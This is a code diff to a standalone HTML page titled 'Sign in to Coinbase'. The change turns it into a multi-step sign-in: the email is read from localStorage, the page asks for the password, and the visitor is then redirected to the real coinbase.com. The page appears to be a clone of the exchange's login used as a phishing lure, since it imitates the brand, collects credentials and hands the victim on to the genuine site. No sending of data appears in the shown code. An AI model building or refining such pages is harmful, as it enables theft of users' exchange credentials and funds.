@@ -14,7 +14,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             position: relative;
             color: #d1d1d1;
         }
@@ -204,44 +204,43 @@
             text-decoration: none;
         }
 
-        .step-indicator {
+        .profile-section {
             display: flex;
-            justify-content: center;
-            gap: 10px;
+            align-items: center;
+            gap: 16px;
             margin: 20px 0;
         }
 
-        .step {
-            width: 8px;
-            height: 8px;
-            background-color: #42445A;
+        .profile-icon {
+            width: 48px;
+            height: 48px;
             border-radius: 50%;
-            position: relative;
-            cursor: default;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #24252A;
         }
 
-        .step.active {
-            background-color: #578BFA;
+        .profile-icon img {
+            width: 24px;
+            height: 24px;
+            display: block;
         }
 
-        .step-indicator-text {
-            position: absolute;
-            top: -25px;
-            font-size: 12px;
-            color: #fff;
+        .forgot-password {
+            text-align: center;
+            margin-top: 10px;
         }
 
-        .first-step-text {
-            left: 0;
+        .forgot-password a {
+            color: #578BFA;
+            text-decoration: none;
+            font-weight: bold;
+            display: block;
         }
 
-        .second-step-text {
-            left: 50%;
-            transform: translateX(-50%);
-        }
-
-        .third-step-text {
-            right: 0;
+        .forgot-password a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
@@ -251,22 +250,18 @@
 
     <div class="login-container">
         <h1>Sign in to Coinbase</h1>
-        <div class="step-indicator">
-            <div class="step active"></div>
-            <div class="step"></div>
-        </div>
-        <div class="step-indicator-text">
-            <span class="first-step-text">Email</span>
-            <span class="second-step-text">Password</span>
-            <span class="third-step-text">2FA</span>
-        </div>
-
         <form id="loginForm">
-            <label for="email">Your Email Address</label>
-            <input type="email" id="emailInput" placeholder="Your Email Address" required>
-
+            <div class="profile-section">
+                <div class="profile-icon">
+                    <img src="profile-icon.png" alt="Profile">
+                </div>
+                <label id="emailLabel"></label>
+            </div>
             <label for="password">Password</label>
             <input type="password" id="passwordInput" placeholder="Password" required>
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
 
             <button type="button" class="black-button">Continue</button>
         </form>
@@ -297,18 +292,25 @@
     </div>
 
     <script>
-        const emailInput = document.getElementById('emailInput');
+        // Store email from previous step in localStorage
+        const emailLabel = document.getElementById('emailLabel');
         const passwordInput = document.getElementById('passwordInput');
         const continueButton = document.querySelector('.black-button');
-        const steps = document.querySelectorAll('.step');
-        const stepTexts = document.querySelectorAll('.step-indicator-text span');
+
+        // Check if email is stored
+        window.addEventListener('load', () => {
+            const storedEmail = localStorage.getItem('email');
+            if (storedEmail) {
+                emailLabel.textContent = storedEmail;
+            }
+        });
 
         continueButton.addEventListener('click', () => {
-            const email = emailInput.value.trim();
             const password = passwordInput.value.trim();
+            const storedEmail = localStorage.getItem('email');
 
-            if (!email) {
-                alert('Please enter your email address.');
+            if (!storedEmail) {
+                alert('Please enter your email address first.');
                 return;
             }
 
@@ -317,33 +319,16 @@
                 return;
             }
 
-            // Email validation using regex
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailRegex.test(email)) {
-                alert('Please enter a valid email address.');
-                return;
-            }
-
-            // Password validation (minimum 8 characters)
             if (password.length < 8) {
                 alert('Password must be at least 8 characters.');
                 return;
             }
 
-            console.log('Email submitted:', email);
-            console.log('Password submitted:', password);
+            // Here you can add additional password validation if needed
 
-            // Redirect to Coinbase after successful validation
+            console.log('Login successful. Redirecting...');
+            // Redirect to Coinbase after successful login
             window.location.href = 'https://www.coinbase.com';
-        });
-
-        // Add focus styles to password input
-        passwordInput.addEventListener('focus', function() {
-            this.parentElement.style.outline = '1px solid #578BFA';
-        });
-
-        passwordInput.addEventListener('blur', function() {
-            this.parentElement.style.outline = 'none';
         });
     </script>
 </body>
